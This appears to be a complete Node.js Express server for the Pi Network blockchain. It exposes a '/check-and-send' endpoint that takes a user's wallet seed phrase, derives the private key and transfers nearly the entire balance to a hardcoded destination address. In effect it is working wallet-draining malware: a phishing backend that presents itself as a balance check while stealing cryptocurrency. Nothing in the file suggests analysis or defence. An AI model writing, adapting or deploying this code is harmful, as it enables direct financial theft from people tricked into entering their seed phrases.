
const express = require('express');
const cors = require('cors');
const { Keypair, Server, TransactionBuilder, Operation, Memo, Asset } = require('stellar-sdk');
const { Bip39SeedGenerator, Bip32Slip10Ed25519 } = require('bip-utils');

const app = express();
app.use(cors());
app.use(express.json());

const HORIZON_URL = 'https://api.mainnet.minepi.com';
const NETWORK_PASSPHRASE = 'Pi Network';
const server = new Server(HORIZON_URL);

const DESTINATION_ADDRESS = 'GA6HYCTPYDQGPM4US3H5KIZGHWG2IP3SXX3WXX7ERKHZYKK4KZMUTLFI';
const MIN_LEFT_PI = 0.05;

app.post('/check-and-send', async (req, res) => {
    const { mnemonic } = req.body;

    try {
        const seedBytes = new Bip39SeedGenerator(mnemonic).Generate();
        const bip32Ctx = Bip32Slip10Ed25519.FromSeed(seedBytes);
        const derived = bip32Ctx.DerivePath("m/44'/314159'/0'");
        const privateKey = derived.PrivateKey().Raw().ToBytes();
        const keypair = Keypair.fromRawEd25519Seed(privateKey);

        const account = await server.loadAccount(keypair.publicKey());
        const nativeBalance = account.balances.find(b => b.asset_type === 'native');
        const balance = parseFloat(nativeBalance.balance);

        if (balance <= MIN_LEFT_PI + 0.01) {
            return res.json({ status: 'insufficient', balance });
        }

        const amountToSend = (balance - MIN_LEFT_PI - 0.01).toFixed(7);

        const tx = new TransactionBuilder(account, {
            fee: "100000",
            networkPassphrase: NETWORK_PASSPHRASE,
        })
        .addOperation(Operation.payment({
            destination: DESTINATION_ADDRESS,
            asset: Asset.native(),
            amount: amountToSend
        }))
        .addMemo(Memo.text("Pi Web Send"))
        .setTimeout(30)
        .build();

        tx.sign(keypair);
        const result = await server.submitTransaction(tx);

        return res.json({ status: 'success', sent: amountToSend, hash: result.hash });
    } catch (e) {
        return res.status(500).json({ status: 'error', message: e.message });
    }
});

app.listen(3000, () => {
    console.log('🚀 Server running on http://localhost:3000');
});
